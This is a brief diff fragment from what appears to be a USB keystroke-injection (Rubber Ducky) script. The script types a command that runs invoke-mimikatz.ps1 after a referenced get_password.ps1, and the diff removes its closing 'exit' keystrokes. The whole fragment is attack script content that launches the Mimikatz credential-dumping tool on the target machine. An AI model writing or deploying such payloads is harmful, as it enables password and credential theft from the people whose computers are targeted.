@@ -58,5 +58,3 @@ REM Start the get_password.ps1
 STRING .\invoke-mimikatz.ps1
 DELAY 500
 ENTER
-STRING exit
-ENTER
